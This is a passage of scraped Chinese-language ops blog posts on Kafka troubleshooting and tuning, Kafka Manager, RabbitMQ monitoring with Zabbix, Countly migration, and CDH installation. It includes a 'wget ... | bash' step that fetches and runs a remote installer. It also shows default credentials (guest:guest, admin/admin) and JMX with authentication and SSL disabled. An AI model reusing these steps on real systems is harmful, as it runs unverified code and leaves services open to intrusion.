(kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,877] INFO [ReplicaFetcherThread-0-4], Stopped (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,877] INFO [ReplicaFetcherThread-0-4], Shutdown completed (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,879] INFO [ReplicaFetcherThread-0-1], Shutting down (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,901] INFO [ReplicaFetcherThread-0-1], Stopped (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,901] INFO [ReplicaFetcherThread-0-1], Shutdown completed (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,903] INFO [ReplicaFetcherThread-0-3], Shutting down (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:10,194] INFO [ReplicaFetcherThread-0-3], Stopped (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:10,194] INFO [ReplicaFetcherThread-0-3], Shutdown completed (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:10,196] INFO [ReplicaFetcherManager on broker 2] shutdown completed (kafka.server.ReplicaFetcherManager)[2018-04-01 11:24:10,196] INFO [ExpirationReaper-2], Shutting down (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,375] INFO [ExpirationReaper-2], Stopped (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,375] INFO [ExpirationReaper-2], Shutdown completed (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,375] INFO [ExpirationReaper-2], Shutting down (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,515] INFO [ExpirationReaper-2], Stopped (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,516] INFO [ExpirationReaper-2], Shutdown completed (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,523] INFO [Replica Manager on Broker 2]: Shut down completely (kafka.server.ReplicaManager)[2018-04-01 11:24:10,529] INFO Shutting down. (kafka.log.LogManager)[2018-04-01 11:24:27,288] INFO Shutdown complete. (kafka.log.LogManager)[2018-04-01 11:24:27,289] INFO [GroupCoordinator 2]: Shutting down. (kafka.coordinator.GroupCoordinator)[2018-04-01 11:24:27,290] INFO [ExpirationReaper-2], Shutting down (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,409] INFO [ExpirationReaper-2], Stopped (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,409] INFO [ExpirationReaper-2], Shutdown completed (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,410] INFO [ExpirationReaper-2], Shutting down (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,563] INFO [ExpirationReaper-2], Stopped (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,563] INFO [ExpirationReaper-2], Shutdown completed (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,565] INFO [GroupCoordinator 2]: Shutdown complete. (kafka.coordinator.GroupCoordinator)[2018-04-01 11:24:27,640] INFO [Kafka Server 2], shut down completed (kafka.server.KafkaServer) 一开始我以为是 centos 的 OOM Killer 关了它，但是当我改了 oom_score 之后依旧不行。而且在/val/log/message 里面没有找的相关操作的 log。我现在应该做些什么能修复他，或者进一步的确定错误原因？ 经过查看 kafka 的启动脚本，上周尝试使用 1bin/kafka-server-start.sh -daemon ./config/server.properties 进行启动，到现在为止 kafka 还在正常运行。和不加 -daemon 区别在于： 12345678910bin/kafka-run-class.sh# Launch modeif [ \"x$DAEMON_MODE\" = \"xtrue\" ]; then #加 daemon 会使用该命令 nohup $JAVA $KAFKA_HEAP_OPTS $KAFKA_JVM_PERFORMANCE_OPTS $KAFKA_GC_LOG_OPTS $KAFKA_JMX_OPTS $KAFKA_LOG4J_OPTS -cp $CLASSPATH $KAFKA_OPTS \"$@\" &gt; \"$CONSOLE_OUTPUT_FILE\" 2&gt;&amp;1 &lt; /dev/null &amp;else #不加时使用的命令 exec $JAVA $KAFKA_HEAP_OPTS $KAFKA_JVM_PERFORMANCE_OPTS $KAFKA_GC_LOG_OPTS $KAFKA_JMX_OPTS $KAFKA_LOG4J_OPTS -cp $CLASSPATH $KAFKA_OPTS \"$@\"fi 机器配置？集群情况？啥都没有…只有日志…zookeeper和broker都需要一定资源,这俩放在一起也会降低稳定性… 1su - jollybi -c \"/data/tools/kafka_2.10-0.9.0.1/bin/kafka-server-start.sh -daemon /data/tools/kafka_2.10-0.9.0.1/config/server.properties 2&gt;&amp;1 &gt; /dev/null\"","link":"/2017/02/11/Bigdata-hadoop/Kafka/kafka10.0.9版本总是在启动一段时间后自动停止/"},{"title":"Kafka性能优化–JVM参数配置优化","text":"img-w650 Kafka集群稳定GC调优 调GC是门手艺活，幸亏Java 7引进了G1 垃圾回收，使得GC调优变的没那么难。G1主要有两个配置选项来调优：MaxGCPauseMillis 和 InitiatingHeapOccupancyPercent，具体参数设置可以参考Google，这里不赘述。 Kafka broker能够有效的利用堆内存和对象回收，所以这些值可以调小点。对于 64Gb内存，Kafka运行堆内存5Gb，MaxGCPauseMillis 和 InitiatingHeapOccupancyPercent 分别设置为 20毫秒和 35。Kafka的启动脚本使用的不是 G1回收，需要在环境变量中加入。 Kafka Broker个数决定因素 磁盘容量：首先考虑的是所需保存的消息所占用的总磁盘容量和每个broker所能提供的磁盘空间。如果Kafka集群需要保留 10 TB数据，单个broker能存储 2 TB，那么我们需要的最小Kafka集群大小5个broker。此外，如果启用副本参数，则对应的存储空间需至少增加一倍（取决于副本参数）。这意味着对应的Kafka集群至少需要 10 个broker。 请求量：另外一个要考虑的是Kafka集群处理请求的能力。这主要取决于对Kafka client请求的网络处理能力，特别是，有多个consumer或者网路流量不稳定。如果，高峰时刻，单个broker的网络流量达到80%，这时是撑不住两个consumer的，除非有两个broker。再者，如果启用了副本参数，则需要考虑副本这个额外的consumer。也可以扩展多个broker来减少磁盘的吞吐量和系统内存。 主要是启动脚本和log4j基本参数的设置和优化，这些参数藏的比较深。1、JVM参数配置优化如果使用的CMS GC算法，建议JVM Heap不要太大，在4GB以内就可以。JVM太大，导致Major GC或者Full GC产生的“stop the world”时间过长，导致broker和zk之间的session超时，比如重新选举controller节点和提升follow replica为leader replica。JVM也不能过小，否则会导致频繁地触发gc操作，也影响Kafka的吞吐量。另外，需要避免CMS GC过程中的发生promotion failure和concurrent failure问题。CMSInitiatingOccupancyFraction=70可以预防concurrent failure问题，提前出发Major GC。Kafka JVM参数可以直接修改启动脚本bin/kafka-server-start.sh中的变量值。下面是一些基本参数，也可以根据实际的gc状况和调试GC需要增加一些相关的参数。 1export KAFKA_HEAP_OPTS=\"-Xmx8G -Xms8G -Xmn4G -XX:PermSize=64m -XX:MaxPermSize=128m -XX:SurvivorRatio=6 -XX:CMSInitiatingOccupancyFraction=70 -XX:+UseCMSInitiatingOccupancyOnly\" 需要关注gc日志中的YGC时间以及CMS GC里面的CMS-initial-mark和CMS-remark两个阶段的时间，这些GC过程是“stop the world”方式完成的。 jdk1.8 优化的话会提示MaxPermSize=128m,PermSize=64m 字面意思是MaxPermSize不需要我们配置了,jdk1.8 版本功能其实已不需要这个优化参数： 12345678[jollybi@kafka3 kafka_2.10-0.8.2.1]$ /data/tools/kafka_2.10-0.8.2.1/bin/kafka-server-start.sh /data/tools/kafka_2.10-0.8.2.1/config/server.properties &amp;[1] 10312[jollybi@kafka3 kafka_2.10-0.8.2.1]$ Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=64m; support was removed in 8.0Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed in 8.0优化参数：export KAFKA_HEAP_OPTS=\"-Xmx4G -Xms4G -Xmn2G -XX:SurvivorRatio=6 -XX:CMSInitiatingOccupancyFraction=70 -XX:+UseCMSInitiatingOccupancyOnly\"export JMX_PORT=\"9999\" ### Kafka Manager监控监听jmx端口,如果没有可不设置。 2、打开JMX端口12主要是为了通过JMX端口监控Kafka Broker信息。可以在bin/kafka-server-start.sh中打开JMX端口变量。export JMX_PORT=9999 3、调整log4j的日志级别如果集群中topic和partition数量较大时，因为log4j的日志级别太低，导致进程持续很长的时间在打印日志。日志量巨大，导致很多额外的性能开销。特别是contoller日志级别为trace级别，这点比较坑。Tips 通过JMX端口设置log4j日志级别，不用重启broker节点 1234567设置日志级别：java -jar cmdline-jmxclient-0.10.3.jar - localhost:9999 kafka:type=kafka.Log4jController setLogLevel=kafka.controller,INFOjava -jar cmdline-jmxclient-0.10.3.jar - localhost:9999 kafka:type=kafka.Log4jController setLogLevel=state.change.logger,INFO 检查日志级别：java -jar cmdline-jmxclient-0.10.3.jar - localhost:9999 kafka:type=kafka.Log4jController getLogLevel=kafka.controllerjava -jar cmdline-jmxclient-0.10.3.jar - localhost:9999 kafka:type=kafka.Log4jController getLogLevel=state.change.logger 4、性能优化技巧4.1、配置合适的partitons数量。 这似乎是kafka新手必问得问题。首先，我们必须理解，partiton是kafka的并行单元。从producer和broker的视角看，向不同的partition写入是完全并行的；而对于consumer，并发数完全取决于partition的数量，即，如果consumer数量大于partition数量，则必有consumer闲置。所以，我们可以认为kafka的吞吐与partition时线性关系。partition的数量要根据吞吐来推断，假定p代表生产者写入单个partition的最大吞吐，c代表消费者从单个partition消费的最大吞吐，我们的目标吞吐是t，那么partition的数量应该是t/p和t/c中较大的那一个。实际情况中，p的影响因素有批处理的规模，压缩算法，确认机制和副本数等，然而，多次benchmark的结果表明，单个partition的最大写入吞吐在10MB/sec左右；c的影响因素是逻辑算法，需要在不同场景下实测得出。 这个结论似乎太书生气和不实用。我们通常建议partition的数量一定要大于等于消费者的数量来实现最大并发。官方曾测试过1万个partition的情况，所以不需要太担心partition过多的问题。下面的知识会有助于读者在生产环境做出最佳的选择： 12345678910a、一个partition就是一个存储kafka-log的目录。b、一个partition只能寄宿在一个broker上。c、单个partition是可以实现消息的顺序写入的。d、单个partition只能被单个消费者进程消费，与该消费者所属于的消费组无关。这样做，有助于实现顺序消费。e、单个消费者进程可同时消费多个partition，即partition限制了消费端的并发能力。f、partition越多则file和memory消耗越大，要在服务器承受服务器设置。g、每个partition信息都存在所有的zk节点中。h、partition越多则失败选举耗时越长。k、offset是对每个partition而言的，partition越多，查询offset就越耗时。i、partition的数量是可以动态增加的（只能加不能减）。 我们建议的做法是，如果是3个broker的集群，有5个消费者，那么建议partition的数量是15，也就是broker和consumer数量的最小公倍数。当然，也可以是一个大于消费者的broker数量的倍数，比如6或者9，还请读者自行根据实际环境裁定。 Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/07/04/Bigdata-hadoop/Kafka/kafka性能优化–JVM参数配置优化/"},{"title":"Bigdata-如何手动更新Kafka中某个Topic的偏移量","text":"如何手动更新Kafka中某个Topic的偏移量 我们都知道，Kafka topic的偏移量一般都是存储在Zookeeper中，具体的路径为/consumers/[groupId]/offsets/[topic]/[partitionId]，比如iteblog主题分区10的偏移量获取如下：在有些场景下，这个工具不满足我们的需求，我们需要的是能够手动设置分区的偏移量为任何有意义的值，而不仅仅是earliest或者latest。那咋办？ 我们都知道，Kafka topic的偏移量一般都是存储在Zookeeper中，具体的路径为/consumers/[groupId]/offsets/[topic]/[partitionId]，比如mongotail_lz4主题分区10的偏移量获取如下： 12345678910111213[zk: 127.0.0.1:2281(CONNECTED) 2] get /consumers/ibm_event/offsets/mongotail_lz4/10293894cZxid = 0x6000011f3ctime = Wed Jul 26 17:57:27 CST 2017mZxid = 0x6000018c9mtime = Wed Jul 26 18:18:27 CST 2017pZxid = 0x6000011f3cversion = 0dataVersion = 20aclVersion = 0ephemeralOwner = 0x0dataLength = 6numChildren = 0 所以，我们可以通过set命令来设置某个分区的偏移量，如下； 12345678910111213[zk: 127.0.0.1:2281(CONNECT get /consumers/ibm_event/offsets/mongotail_lz4/10 0 0cZxid = 0x6000011f3ctime = Wed Jul 26 17:57:27 CST 2017mZxid = 0x60000204cmtime = Wed Jul 26 18:37:21 CST 2017pZxid = 0x6000011f3cversion = 0dataVersion = 21aclVersion = 0ephemeralOwner = 0x0dataLength = 1numChildren = 0 12个分区分别更新过去。 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/06/29/Bigdata-hadoop/Kafka/如何手动更新Kafka中某个Topic的偏移量/"},{"title":"Bigdata-开源的Kafka集群管理器(Kafka Manager)","text":"Kafka ManagerA tool for managing Apache Kafka. It supports the following: 管理多个群集 容易检查集群状态（主题，消费者，偏移量，经纪人，副本分发，分区分配） 运行首选副本选举 使用选项生成分区分配，以选择要使用的代理 运行分区的重新分配（基于生成的分配） 创建可选主题配置的主题（0.8.1.1具有不同于0.8.2+的配置） 删除主题（仅支持0.8.2+，并记住在代理配 置中设置delete.topic.enable = true） 主题列表现在表示标记为删除的主题（仅支持0.8.2+） 批量生成多个主题的分区分配，并选择要使用的代理 批量运行多个主题的分区重新分配 将分区添加到现有主题 更新现有主题的配置 可选地，启用JMX轮询代理级和主题级度量。 可选地筛选出在zookeeper中没有ids / owner /＆offset /目录的消费者。 参考开源地址：https://github.com/yahoo/kafka-manager RequirementsKafka 0.8.1.1 or 0.8.2. or 0.9.0. or 0.10.0.*Java 8+ 123456sudo wget --header \"Cookie: oraclelicense=accept-securebackup-cookie” http://download.oracle.com/otn-pub/java/jdk/8u144-b01/090f390dda5b47b9b721c7dfaa008135/jdk-8u144-linux-x64.tar.gzsudo vim /etc/profileexport JAVA_HOME=/home/jollybi/tools/jdk1.8.0_144export LASSPATH=.:$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$JAVA_HOME/binexport PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$TOMCAT_HOME/bin:$PATH Deployment1234567891011121314151617git clone https://github.com/yahoo/kafka-manager.git./sbt clean dist[info] Compilation completed in 13.366 smodel contains 672 documentable templates[info] Main Scala API documentation successful.[info] Packaging /home/jollybi/kafka-manager/target/scala-2.11/kafka-manager_2.11-1.3.3.8-javadoc.jar ...[info] Done packaging.[info] Packaging /home/jollybi/kafka-manager/target/scala-2.11/kafka-manager_2.11-1.3.3.8.jar ...[info] Done packaging.[info] Packaging /home/jollybi/kafka-manager/target/scala-2.11/kafka-manager_2.11-1.3.3.8-sans-externalized.jar ...[info] Done packaging.[info][info] Your package is ready in /home/jollybi/kafka-manager/target/universal/kafka-manager-1.3.3.8.zip[info][success] Total time: 142 s, completed Jul 27, 2017 3:48:35 PM完成 Starting the service12345678910111213141516171819202122232425262728293031解压缩生成的zip文件后，将工作目录更改为可以运行的服务：unzip /home/jollybi/kafka-manager/target/universal/kafka-manager-1.3.3.8.zip修改zk地址和管理员账号和密码：vim kafka-manager-1.3.3.8/conf/application.conf#kafka-manager.zkhosts=\"kafka-manager-zookeeper:2181\"#zk集群可以这么配置：kafka-manager.zkhosts=\"kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281\"#根据个人公司这里可以开启true 设置账号和密码basicAuthentication.enabled=truebasicAuthentication.username=\"admin\"basicAuthentication.password=\"admin\"默认情况下，它将选择端口9000.这是可以覆盖的，配置文件的位置也是如此。例如：$ ./bin/kafka-manager -Dconfig.file=conf/application.conf -Dhttp.port=8080后台生效：$ ./bin/kafka-manager -Dconfig.file=conf/application.conf -Dhttp.port=8080 &amp;再次，如果java不在您的路径中，或者您需要针对不同版本的Java运行，请按如下所示添加-java-home选项：$ bin/kafka-manager -java-home /usr/local/oracle-java-8 Packaging12345If you'd like to create a Debian or RPM package instead, you can run one of:sbt debian:packageBinsbt rpm:packageBin 查看端口：12345[jollybi@kafka1 conf]$ netstat -ntulp | grep 8080(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)tcp6 0 0 :::8080 :::* LISTEN 70517/java 四、安装配置中的两个小坑 1234567891011121314151617181、安装配置上面已经有说明介绍步骤。2、kafka的服务器必须添加hostname对应的host域名解析，并重启kafka这个是java本身处理的一个机制问题，通过代码修改和绑定host都可以解决，如果不处理，报出来的错误如下：at org.apache.kafka.clients.consumer.KafkaConsumer.pollOnce(KafkaConsumer.java:974) ~[org.apache.kafka.kafka-clients-0.10.0.1.jar:na][error] k.m.j.KafkaJMX$ - Failed to connect to service:jmx:rmi:///jndi/rmi://10.143.40.239:9999/jmxrmijava.rmi.ConnectException: Connection refused to host: 127.0.0.1; nested exception is: java.net.ConnectException: Connection refused从一个运维人员的角度出发，改host解析是最得心应手的，登录kafka的服务器，打开/etc/hosts文件，将主机名对应的解析记录修改为本机对外通信的ip地址，另外将127.0.0.1和::1对应的主机名删掉，修改如下，修改后必须重启kafka才能生效。127.0.0.1 localhost.localdomain localhost169.44.62.19 kafka1.jollychic.com kafka1169.44.59.18 kafka2.jollychic.com kafka2169.44.62.17 kafka3.jollychic.com kafka3169.55.32.22 kafka4.jollychic.com kafka410.155.90.13 zk1.jollychic.com10.155.90.15 zk2.jollychic.com10.155.90.18 zk3.jollychic.com 网站访问kafka Manger这里我设置了登录账号和密码： admin admin 创建kafka名字;选择kafka版本号;JMX这个不需要;下面选择默认点击确认即可. (2)kafka 启用 JMX端口 1234567891011121314以如下命令重新启动kafkaJMX_PORT=9999 bin/kafka-server-start.sh config/server.properties或者修改kafka-server-start.sh 文件，追加JMX_PORT=\"9999\" if [ \"x$KAFKA_HEAP_OPTS\" = \"x\" ]; then export KAFKA_HEAP_OPTS=\"-Xmx1G -Xms1G\" export JMX_PORT=\"9999\"fi然后重新启动kafkabin/kafka-server-start.sh config/server.properties但是Metrics中数据都是零查看 kafka manager 报错，无法连接jxm 1234567891011解决方法 修改每个kafka broker的 kafka_2.11-0.10.1.0/bin/kafka-run-class.sh文件​# JMX settingsif [ -z \"$KAFKA_JMX_OPTS\" ]; then KAFKA_JMX_OPTS=\"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=75.126.5.162\"fi-Djava.rmi.server.hostname 的值为当前kafka服务器ip这里说明下集群kafka都需要修改 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/05/28/Bigdata-hadoop/Kafka/开源的Kafka集群管理器(Kafka Manager)/"},{"title":"Zabbix 3.0 监控推送rabbitmq队列-消息堆积","text":"Zabbix 3.0 监控推送rabbitmq队列对于RabbitMQ的监控，除了服务器基本信息（硬盘、CPU、内存、IO等）以及MQ的进程和端口，我们也可以通过请求url访问管理API监控其集群和队列的情况。在java api 3.6.0以后，channel接口为我们提供了如下接口： messageCount：查询队列未消费的消息数，可以监控消息堆积的情况。 consumerCount：队列的消费者个数，可以对消费者进行监控 1.监控告警需求问题： 1234message.bi队列 积压&gt; 300 或者 消费者数&lt;=2message.push.cart队列 积压 &gt;10000 或者消费者数&lt;5message.user.related队列 积压&gt;2000 或者 消费者数&lt;=2message.cart队列 积压&gt;10000 或者 消费者数&lt;=2 2.编写Python脚本监控获取消费者数监控，队列。 12345678910111213141516171819202122vim rabbitmq-monitor.py#!/bin/env python# -*- coding: UTF-8 -*-import sys, urllib2, base64, json, re,timeip = \"169.23.73.22\"keys = ('messages_ready',)def GetRabbitmqData(): request = urllib2.Request(\"http://%s:15672/api/queues\" % ip) base64string = base64.b64encode('guest:guest') request.add_header(\"Authorization\", \"Basic %s\" % base64string) result = urllib2.urlopen(request) data = json.loads(result.read()) return datadata=GetRabbitmqData()#print datafor queue in data: try: print \"消费者数量:\",queue['consumers'],\"队列:\",queue['name'],\"消息积压数:\",int(queue[keys[0]]) except: pass 12345678910111213141516171819[root@message-center-mq zabbix]# python rabbitmq-monitor.py消费者数量: 0 队列: 79d02dde-2007-4a49-b94b-0d4bee67b19c 消息积压数: 0消费者数量: 0 队列: aliveness-test 消息积压数: 0消费者数量: 0 队列: cartService.orderCancel.update 消息积压数: 0消费者数量: 0 队列: cartService.virtualOrderCancel.update 消息积压数: 0消费者数量: 0 队列: e9de65bd-be59-4c1c-b4a8-7312f382ac59 消息积压数: 0消费者数量: 3 队列: message.bi 消息积压数: 0消费者数量: 3 队列: message.cart 消息积压数: 0消费者数量: 3 队列: message.console 消息积压数: 0消费者数量: 3 队列: message.logistics 消息积压数: 0消费者数量: 3 队列: message.order.info 消息积压数: 0消费者数量: 30 队列: message.push.cart 消息积压数: 0消费者数量: 3 队列: message.style 消息积压数: 0消费者数量: 3 队列: message.user.related 消息积压数: 0消费者数量: 0 队列: payment.virtual.notify.success 消息积压数: 0消费者数量: 1 队列: 61b73745-4c74-475b-803e-bf2d48d2fa50 消息积压数: 0消费者数量: 1 队列: a984d00a-8bbe-43c1-aa20-c1dc788ddd97 消息积压数: 0消费者数量: 1 队列: e569e8a1-b7c9-4736-8bf8-13d76ecf7577 消息积压数: 0消费者数量: 3 队列: push.station.task.status 消息积压数: 0 编写zabbix-agentd 监控： 123456789[root@message-center-mq zabbix]# vim zabbix_agentd.confUserParameter=rabbitmq.consumer.bi,python /etc/zabbix/rabbitmq-monitor.py | grep message.bi |awk -F'[ :]' '&#123;print $3&#125;'UserParameter=rabbitmq.overstock.bi,python /etc/zabbix/rabbitmq-monitor.py | grep message.bi |awk -F'[ :]' '&#123;print $NF&#125;'UserParameter=rabbitmq.consumer.push.cart,python /etc/zabbix/rabbitmq-monitor.py | grep message.push.cart |awk -F'[ :]' '&#123;print $3&#125;'UserParameter=rabbitmq.overstock.push.cart,python /etc/zabbix/rabbitmq-monitor.py | grep message.push.cart |awk -F'[ :]' '&#123;print $NF&#125;'UserParameter=rabbitmq.consumer.user.related,python /etc/zabbix/rabbitmq-monitor.py | grep message.user.related |awk -F'[ :]' '&#123;print $3&#125;'UserParameter=rabbitmq.overstock.user.related,python /etc/zabbix/rabbitmq-monitor.py | grep message.user.related |awk -F'[ :]' '&#123;print $NF&#125;'UserParameter=rabbitmq.consumer.cart,python /etc/zabbix/rabbitmq-monitor.py | grep message.cart |awk -F'[ :]' '&#123;print $3&#125;'UserParameter=rabbitmq.overstock.cart,python /etc/zabbix/rabbitmq-monitor.py | grep message.cart |awk -F'[ :]' '&#123;print $NF&#125;' 监控模板下载：在我github上面. weixin监控效果图：","link":"/2017/07/29/Bigdata-hadoop/RabbitMQ/Zabbix 3.0 监控推送rabbitmq队列/"},{"title":"Bigdata-countly需要迁移","text":"Countly 搭建1234567wget https://github.com/Countly/countly-server/releases/download/v17.05.1/countly-community-edition-v17.05.1.tar.gztar -zxvf countly-community-edition-v17.05.1.tar.gzsudo su - cd COUNTLY_INSTALLATION_DIRECTORY/binbash countly.install.sh禁用SELinux 官方安装文档：Countly install目前countly需要迁移，所需countly版本于官方提供的安装方案有冲突，安装官方countly让其设置所需环境变量及其启动脚本，手动指定安装nojs版本，拷贝原countly文件，具体如下： 123456789101112131415161718192021221、cd /data #countly安装在data目录 我看了安装脚本，是当前在哪个目录，安装文件就在哪个目录wget -qO- http://c.ly/install | bash 2、rpm -qa | grep -i nodejs | xargs -I&#123;&#125; yum remove &#123;&#125; -y卸载掉官网安装的最新nodejs 然后新建如下yum源，用于安装旧版所需nodejs，也可以到nodejs官网下载所需nodejscat /etc/yum.repos.d/nodesource-el.repo [nodesource]name=Node.js Packages for Enterprise Linux 7 - $basearchbaseurl=https://rpm.nodesource.com/pub_5.x/el/7/$basearchfailovermethod=priorityenabled=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/NODESOURCE-GPG-SIGNING-KEY-EL[nodesource-source]name=Node.js for Enterprise Linux 7 - $basearch - Sourcebaseurl=https://rpm.nodesource.com/pub_5.x/el/7/SRPMSfailovermethod=priorityenabled=0gpgkey=file:///etc/pki/rpm-gpg/NODESOURCE-GPG-SIGNING-KEY-ELgpgcheck=1 安装老版本所需nodejs1yum install nodejs 1233、拷贝源countly文件到/data/countly目录修改 /data/countly/api/config.js 和 /data/countly/frontend/express/config.js 3001端口和 6001端口监听地址换成 本地私有地址 #源文件是监听的原来机器的内网地址，不修改的话，服务启动不了。 123456789101112131415161718192021224、拷贝mongo数据目录到/data/mongo目录，修改mongo配置文件.cat /etc/mongod.confsystemLog: destination: file logAppend: true path: /data/mongodb/mongod.logstorage: dbPath: /data/mongo journal: enabled: true engine: mmapv1processManagement: fork: true pidFilePath: /data/mongodb/mongod.pidnet: port: 27017 bindIp: 127.0.0.1security: authorization: enabledoperationProfiling: slowOpThresholdMs: 40960 125、修改硬盘block： blockdev --setra 256 /dev/mapper/xvdc--vg-xvdc–lv ##按照mongo提示操作 126、修改nginx配置文件 conf.d/default.conf 将127.0.0.1修改为本地私有地址 123456787、重启countly mongodb nginxcountly restart/etc/init.d/mongod restartservice nginx restart迁移完毕 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/03/29/Bigdata-hadoop/countly/Bigdata-countly搭建与迁移方案/"},{"title":"Bigdata-Cloudera Manager5及CDH5安装指导","text":"问题导读：1.什么是cloudera CM 、CDH?2.CDH、CM有哪些版本？3.CDH、CM有哪些安装方式？4.CDH如何开发？ 什么是CDHhadoop是一个开源项目，所以很多公司在这个基础进行商业化，Cloudera对hadoop做了相应的改变。Cloudera公司的发行版，我们将该版本称为CDH。 很多新手问的最多的问题是，哪个是收费的，那个是免费的。Cloudera Express版本是免费的Cloudera Enterprise是需要购买注册码的 更多内容：Cloudera Hadoop什么是CDH及CDH版本介绍 :http://www.aboutyun.com/thread-6788-1-1.html CDH（Cloudera）与hadoop（apache）对比 : http://www.aboutyun.com/thread-9225-1-1.html 大数据架构师基础：hadoop家族，Cloudera产品系列等各种技术 : http://www.aboutyun.com/thread-6842-1-1.html 官网介绍 主页：https://www.cloudera.com/downloads/manager/5-12-0.html CM(Cloudera Manager)有三种安装方式：1.第一种使用cloudera-manager-installer.bin安装 这种安装方式，只要从官网下载cloudera-manager-installer.bin 然后执行这个bin文件，剩下的就是等待下载和安装。但是这个时间不是一般的长，最好吃个饭，睡个觉，最后看到还在安装过程中。此帖安装步骤及遇到问题记录很详细，可参考Cloudera Manager5及CDH5在线（cloudera-manager-installer.bin）安装详细文档Cloudera Manager5及CDH5安装指导（终极在线安装） 问题导读：1.Cloudera Manager5安装需要哪些环境要求？2.哪些Linux系统上，可以安装Cloudera Manager5？3.在安装cdh的过程中，该如何选择版本？ 安装环境要求 1234567891011121314151617181920212223242526272829303132集群中的四台主机必须满足以下要求：主机必须至少有16 GB的RAM对于RAM，我们或许没有太多的概念，下面可以参考RAM容量是运行中的程序所占用的空间，他运行需要的空间、ROM容量是你的系统可以存放，占用的空间，你的所有系统文件，程序都在这里存放。必须使用root用户，或则使用sudo无密码访问（也就是说当你使用其它用户，使用sudo的时候，不能输入密码）如果使用root用户，必须使用相同的密码主机必须能上网，允许安装向导访问cdm.jollychic.com可以从下面选择一个系统RHEL-兼容系统Red Hat Enterprise Linux and CentOS 5, 64-bitRed Hat Enterprise Linux and CentOS 6, 64-bitRed Hat Enterprise Linux and CentOS 7 in SE Linux ModeSLES - SUSE Linux Enterprise Server 11, 64-bit. Service Pack 2或则更高版本. 更新存储库必须是激活的和 SUSE Linux Enterprise 软件开发包11 SP1 .Debian - Debian 7.0 and 7.1, 64-bitUbuntu - Ubuntu 12.04, 64-bit如果要求不能上面满足，安装会不成功。关于Cloudera Manager安装选项和安装要求的详细信息可以查看Cloudera Manager安装向导（英文版）补充和强调一些内容1.关闭防火墙2.配置host，如下形式3.swapoff -a 关闭swap分区添加开机启动生效：echo never &gt; /sys/kernel/mm/transparent_hugepage/defragecho never &gt; /sys/kernel/mm/transparent_hugepage/enabled 环境：123456系统： CentOS Linux release 7.3.1611 (Core) 2台Namenode10台DataNode1台cdm 安装Cloudera Manager1台gateway 安装步骤： 准备工作 1234567891011121314151617181920212223242526配置hosts14台服务器需要配置hostname及hosts如下（这里一定要配置正确否则，会面会出通信问题）vim /etc/hosts127.0.0.1 localhost.localdomain localhost10.155.90.132 cdm cdm.jollychic.com10.155.90.134 gateway gateway.jollychic.com10.155.90.165 namenode1 namenode1.jollychic.com10.155.90.146 namenode2 namenode2.jollychic.com10.155.90.177 datanode1 datanode1.jollychic.com10.155.90.184 datanode2 datanode2.jollychic.com10.155.90.166 datanode3 datanode3.jollychic.com10.155.90.188 datanode4 datanode4.jollychic.com10.155.90.156 datanode5 datanode5.jollychic.com10.155.90.172 datanode6 datanode6.jollychic.com10.155.90.182 datanode7 datanode7.jollychic.com10.155.90.142 datanode8 datanode8.jollychic.com10.155.90.151 datanode9 datanode9.jollychic.com10.155.90.159 datanode10 